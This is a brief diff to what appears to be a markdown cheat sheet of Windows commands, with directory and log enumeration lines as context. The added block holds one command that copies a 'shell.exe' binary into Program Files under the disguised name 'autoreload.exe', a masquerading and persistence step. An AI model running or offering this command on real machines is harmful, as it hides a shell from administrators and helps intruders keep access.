@@ -36,4 +36,8 @@ tree /f /a
 dir /s/b *.log
 ```
 
+```
+copy C:\Users\Public\shell.exe "C:\Program Files\Common Files\Services\autoreload.exe" /Y
+```
+
 
